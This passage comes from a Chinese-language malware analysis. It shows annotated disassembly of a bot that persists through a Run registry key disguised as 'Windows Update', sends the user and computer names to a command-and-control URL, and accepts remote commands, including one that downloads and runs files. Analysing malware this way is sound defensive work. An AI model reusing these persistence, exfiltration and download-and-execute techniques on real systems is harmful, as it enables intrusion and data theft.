
```
004011AE  /$  55                    push    ebp
004011AF  |.  8BEC                  mov     ebp, esp
004011B1  |.  81C4 F8FEFFFF        add     esp, -108
004011B7  |.  68 00010000          push    100                       ; /Length = 100 (256.)
004011BC  |.  8D85 F8FEFFFF       lea     eax, dword ptr [ebp-108]    ; |
004011C2  |.  50                  push    eax                       ; |Destination
004011C3  |.  E8 4A030000         call    <jmp.&kernel32.RtlZeroMemory> ; \RtlZeroMemory
004011C8  |.  68 00010000          push    100                       ; /BufSize = 100 (256.)
004011CD  |.  8D85 F8FEFFFF       lea     eax, dword ptr [ebp-108]    ; |
004011D3  |.  50                  push    eax                       ; |PathBuffer
004011D4  |.  6A 00               push    0                         ; |hModule = NULL
004011D6  |.  E8 2B030000         call    <jmp.&kernel32.GetModuleFileName> ; \GetModuleFileNameA
004011DB  |.  8D45 FC             lea     eax, dword ptr [ebp-4]
004011DE  |.  50                  push    eax                       ; /pHandle
004011DF  |.  6A 02               push    2                         ; |Access = KEY_SET_VALUE
004011E1  |.  6A 00               push    0                         ; |Reserved = 0
004011E3  |.  68 70304000         push    00403070                  ; |Subkey = "Software\Microsoft\Windows\CurrentVersion\Run\"
004011E8  |.  68 01000080         push    80000001                  ; |hKey = HKEY_CURRENT_USER
004011ED  |.  E8 8C030000         call    <jmp.&advapi32.RegOpenKeyExA> ; \RegOpenKeyExA
004011F2  |.  83F8 00             cmp     eax, 0
004011F5  |.  75 2D               jnz     short 00401224
004011F7  |.  8D85 F8FEFFFF       lea     eax, dword ptr [ebp-108]    ;  获取当前进程镜像的路径长度
004011FD  |.  50                  push    eax                       ; /String
004011FE  |.  E8 39030000         call    <jmp.&kernel32.lstrlenA>    ; \lstrlenA
00401203  |.  50                  push    eax                       ; /BufSize
00401204  |.  8D85 F8FEFFFF       lea     eax, dword ptr [ebp-108]    ; |
0040120A  |.  50                  push    eax                       ; |Buffer
0040120B  |.  6A 01               push    1                         ; |ValueType = REG_SZ
0040120D  |.  6A 00               push    0                         ; |Reserved = 0
0040120F  |.  68 9F304000         push    0040309F                  ; |ValueName = "Windows Update"
00401214  |.  FF75 FC             push    dword ptr [ebp-4]         ; |hKey
00401217  |.  E8 68030000         call    <jmp.&advapi32.RegSetValueExA> ; \RegSetValueExA
0040121C  |.  FF75 FC             push    dword ptr [ebp-4]         ; /hObject
0040121F  |.  E8 BE020000         call    <jmp.&kernel32.CloseHandle> ; \CloseHandle
00401224  |>  C9                  leave
00401225  \\.  C3                 retn
```

### 4. 获取本机用户名及计算机名，POST 到远端服务器

`http://mmmbsbt.co.cc/admin/bot.php?mode=2&ident=AdministratorPC-201008252144`

代码:

```
004013D5  /$  55                    push    ebp
004013D6  |.  8BEC                  mov     ebp, esp
004013D8  |.  83C4 FC              add     esp, -4
004013DB  |.  6A 40                push    40                      ; /Protect = PAGE_EXECUTE_READWRITE
004013DD  |.  68 00100000          push    1000                    ; |AllocationType = MEM_COMMIT
004013E2  |.  68 00020000          push    200                     ; |Size = 200 (512.)
004013E7  |.  6A 00                push    0                       ; |Address = NULL
004013E9  |.  E8 30010000          call    <jmp.&kernel32.VirtualAlloc> ; \VirtualAlloc
004013EE  |.  8945 FC              mov     dword ptr [ebp-4], eax
004013F1  |.  C700 6D6F6465        mov     dword ptr [eax], 65646F6D ;  向 buffer 中填充 mode=2&ident=
004013F7  |.  83C0 04              add     eax, 4
004013FA  |.  C700 3D322669        mov     dword ptr [eax], 6926323D
00401400  |.  83C0 04              add     eax, 4
00401403  |.  C700 64656E74        mov     dword ptr [eax], 746E6564
00401409  |.  83C0 04              add     eax, 4
0040140C  |.  C600 3D              mov     byte ptr [eax], 3D
0040140F  |.  40                   inc     eax
00401410  |.  50                   push    eax
00401411  |.  50                   push    eax
00401412  |.  E8 74FFFFFF          call    0040138B                ;  向 buffer 追加当前系统用户名，并返回用户名长度
00401417  |.  8BC8                 mov     ecx, eax
00401419  |.  58                   pop     eax
0040141A  |.  03C1                 add     eax, ecx                ;  eax = 用户名后地址
0040141C  |.  50                   push    eax                     ;  此时 buffer 内容为 mode=2&ident=Administrator
0040141D  |.  50                   push    eax
0040141E  |.  E8 8DFFFFFF          call    004013B0                ;  获取计算机名，并追加到 buffer 中，返回计算机名长度
00401423  |.  FF75 FC              push    dword ptr [ebp-4]       ;  此时 buffer 内容为"mode=2&ident=AdministratorPC-201008252144"
00401426  |.  FF75 FC              push    dword ptr [ebp-4]
00401429  |.  E8 D2FBFFFF          call    00401000
0040142E  |.  68 00800000          push    8000                    ; /FreeType = MEM_RELEASE
00401433  |.  6A 00                push    0                       ; |Size = 0
00401435  |.  FF75 FC              push    dword ptr [ebp-4]       ; |Address
00401438  |.  E8 E7000000          call    <jmp.&kernel32.VirtualFree> ; \VirtualFree
0040143D  |.  C9                   leave
0040143E  \\.  C3                  retn
```

### 5. 再 POST `http://mmmbsbt.co.cc/admin/bot.php?mode=2`，并接收远端指令

指令包括 `!dwn`、`!clo`、`!rem`。

**`!dwn` 指令：**

指令格式：`!dwn EXE_URL_Address File_Save_Path Optional_param` // 三个参数

从第一个参数中下载文件保存到第二个参数的路径中，然后立即执行下载的文件

代码:
